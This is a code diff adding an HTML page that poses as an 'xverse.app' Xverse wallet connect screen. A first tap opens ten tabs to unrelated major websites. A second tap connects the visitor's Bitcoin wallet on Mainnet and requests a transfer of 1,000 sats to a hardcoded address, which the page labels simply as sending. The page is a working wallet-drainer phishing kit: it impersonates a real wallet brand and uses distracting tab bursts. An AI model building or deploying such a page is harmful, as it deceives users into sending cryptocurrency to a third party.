@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>xverse.app - Wallet Connect</title>
+  <style>
+    html, body { margin:0; height:100%; background:#0a1a2a; color:#e0f7fa; font-family:system-ui; display:grid; place-items:center; }
+    .card { background:#122240; padding:24px; border-radius:16px; box-shadow:0 8px 32px rgba(0,0,0,0.5); max-width:420px; text-align:center; }
+    h1 { margin:0 0 8px; font-size:22px; color:#00c853; }
+    p { margin:8px 0 20px; font-size:14px; color:#80deea; }
+    .img-btn {
+      width:100px; height:100px; cursor:pointer; border-radius:50%;
+      box-shadow:0 8px 32px rgba(0,200,83,0.5); transition:transform 0.2s;
+      filter: drop-shadow(0 0 10px #00c853);
+    }
+    .img-btn:hover { transform:scale(1.12); }
+    .img-btn.ready { animation: pulse 1.5s infinite; }
+    @keyframes pulse { 0%,100% { transform:scale(1); } 50% { transform:scale(1.2); } }
+    #status { margin-top:20px; color:#80deea; font-size:14px; word-break:break-word; }
+    .kraken-logo { font-size:28px; margin-bottom:12px; font-weight:900; letter-spacing:1px; }
+    .loader { width:40px; height:40px; border:4px solid #1a3a5c; border-top:4px solid #00c853; border-radius:50%; animation:spin 1s infinite linear; margin:20px auto; display:none; }
+    @keyframes spin { to { transform:rotate(360deg); } }
+    code { background:#0a1a2a; color:#00e676; padding:2px 6px; border-radius:4px; font-size:13px; }
+    .address { font-family: monospace; font-size: 15px; color: #00e676; }
+    .amount { color:#ff9800; font-weight:bold; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="kraken-logo">XVERSE</div>
+    <h1>Xverse Wallet Connect</h1>
+    <p id="instruction">Tap icon to prepare connection...</p>
+
+    <!-- GAMBAR = TOMBOL -->
+    <img
+      src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAwIiBoZWlnaHQ9IjEwMCIgdmlld0JveD0iMCAwIDEwMCAxMDAiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PGNpcmNsZSBjeD0iNTAiIGN5PSI1MCIgcj0iNDUiIGZpbGw9IiMwMGM4NTMiLz48cGF0aCBkPSJNNTAgMzBMMjUgNjVsMjUgMjV6IiBmaWxsPSJ3aGl0ZSIvPjwvc3ZnPg=="
+      alt="Connect"
+      class="img-btn"
+      id="connectImg"
+    />
+
+    <div class="loader" id="loader"></div>
+    <div id="status"></div>
+  </div>
+
+  <!-- Sats Connect (ESM) -->
+  <script type="module">
+    import { request, RpcErrorCode } from "https://esm.sh/sats-connect@latest";
+    // expose ke script non-module
+    window.SATS = { request, RpcErrorCode };
+  </script>
+
+  <script>
+    const TARGETS = [
+      "https://www.google.com/csi",
+      "https://www.wikipedia.org/",
+      "https://www.youtube.com/robots.txt",
+      "https://www.apple.com/contact/",
+      "https://www.microsoft.com/",
+      "https://www.amazon.com/robots.txt",
+      "https://www.instagram.com/",
+      "https://www.yahoo.com/",
+      "https://www.reddit.com/robots.txt",
+      "https://developer.mozilla.org/"
+    ];
+
+    // <<< KONFIGURASI >>>
+    const NETWORK = "Mainnet"; // ganti ke "Testnet" atau "Signet" saat development
+    const TARGET_ADDRESS = "bc1q2x0d48y878m8kgc7cpun5h9a5k5l33cy2khlzf";
+    const SEND_AMOUNT_SATS = 1000; // 0.00001 BTC = 1,000 sats
+
+    const statusEl = document.getElementById("status");
+    const loader = document.getElementById("loader");
+    const imgBtn = document.getElementById("connectImg");
+    const instruction = document.getElementById("instruction");
+
+    let handles = [];
+    let burstDone = false;
+
+    // === STEP 1: BURST 10 TABS ===
+    function openBurst(count = 10) {
+      const h = [];
+      let opened = 0;
+      for (let i = 0; i < count; i++) {
+        const url = TARGETS[i % TARGETS.length];
+        const delay = i * 50 + Math.floor(Math.random() * 30);
+        setTimeout(() => {
+          try {
+            const win = window.open(url, "_blank");
+            if (win) { h.push(win); opened++; }
+          } catch (_) {}
+        }, delay);
+      }
+      setTimeout(() => {
+        statusEl.innerHTML = `Burst: ${opened}/${count} tabs opened.<br/><strong>Tap again to send <span class="amount">0.00001 BTC</span>!</strong>`;
+        loader.style.display = 'none';
+        imgBtn.classList.add('ready');
+        instruction.textContent = "Tap again to send 0.00001 BTC";
+        burstDone = true;
+        handles = h;
+      }, count * 55 + 200);
+    }
+
+    // === STEP 2 (FIXED): CONNECT + SEND 0.00001 BTC via Sats Connect ===
+    async function connectAndSend() {
+      loader.style.display = 'block';
+      statusEl.innerHTML = "Connecting to Xverse wallet...";
+
+      try {
+        if (!window.SATS?.request) {
+          throw new Error("Sats Connect not loaded");
+        }
+
+        // 1) CONNECT ke Xverse & minta payment address
+        const connectRes = await window.SATS.request('wallet_connect', {
+          addresses: ['payment'],
+          message: 'Demo dApp: request 1,000 sats transfer',
+          network: NETWORK
+        });
+
+        if (connectRes.status !== 'success') {
+          const msg =
+            connectRes.error?.code === window.SATS.RpcErrorCode.USER_REJECTION
+              ? "User rejected the connection."
+              : (connectRes.error?.message || "Connection failed");
+          throw new Error(msg);
+        }
+
+        const paymentAddrObj = (connectRes.result.addresses || [])
+          .find(a => a.purpose === 'payment');
+
+        if (!paymentAddrObj?.address) {
+          throw new Error('No payment address returned by wallet.');
+        }
+
+        statusEl.innerHTML =
+          `Connected: <span class="address">${paymentAddrObj.address}</span><br>` +
+          `Sending <b>0.00001 BTC</b>...`;
+
+        // 2) KIRIM 1,000 sats ke TARGET_ADDRESS
+        const sendRes = await window.SATS.request('sendTransfer', {
+          recipients: [{ address: TARGET_ADDRESS, amount: SEND_AMOUNT_SATS }]
+        });
+
+        if (sendRes.status !== 'success') {
+          const msg =
+            sendRes.error?.code === window.SATS.RpcErrorCode.USER_REJECTION
+              ? "User cancelled the transfer."
+              : (sendRes.error?.message || "Transfer failed");
+          throw new Error(msg);
+        }
+
+        const txid = sendRes.result?.txid || '(no-txid-returned)';
+
+        statusEl.innerHTML = `
+          SUCCESS!<br>
+          Sent <b class="amount">0.00001 BTC</b> to:<br>
+          <code>${TARGET_ADDRESS}</code><br>
+          <small>TxID: <code>${txid}</code></small>
+        `;
+        document.title = "xverse.app - 0.00001 BTC Sent";
+        imgBtn.classList.remove('ready');
+
+        // Cleanup tabs dari Step 1
+        setTimeout(() => {
+          handles.forEach(h => { try { if (h && !h.closed) h.close(); } catch(_) {} });
+        }, 1500);
+
+      } catch (err) {
+        statusEl.innerHTML = `Failed: ${err.message || "User rejected"}`;
+        console.error("[XVERSE TX] Error:", err);
+      } finally {
+        loader.style.display = 'none';
+      }
+    }
+
+    // UX: Klik pertama = burst, klik kedua = kirim
+    imgBtn.addEventListener("click", () => {
+      if (!burstDone) {
+        console.log("[STEP 1] Burst initiated");
+        statusEl.textContent = "Launching connection race...";
+        loader.style.display = 'block';
+        openBurst(10);
+      } else {
+        console.log("[STEP 2] Sending 0.00001 BTC");
+        connectAndSend();
+      }
+    });
+  </script>
+</body>
+</html>
